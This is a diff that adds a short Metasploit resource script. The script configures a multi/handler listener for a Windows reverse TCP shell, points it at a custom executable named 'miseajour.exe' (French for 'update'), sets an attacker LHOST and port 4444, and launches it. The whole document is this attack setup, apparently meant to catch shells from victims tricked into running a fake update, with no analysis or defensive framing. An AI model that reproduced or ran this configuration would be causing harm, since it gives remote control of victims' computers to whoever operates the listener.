@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set EXE::Custom /root/miseajour.exe
+set LHOST 175.0.0.1
+set LPORT 4444
+exploit
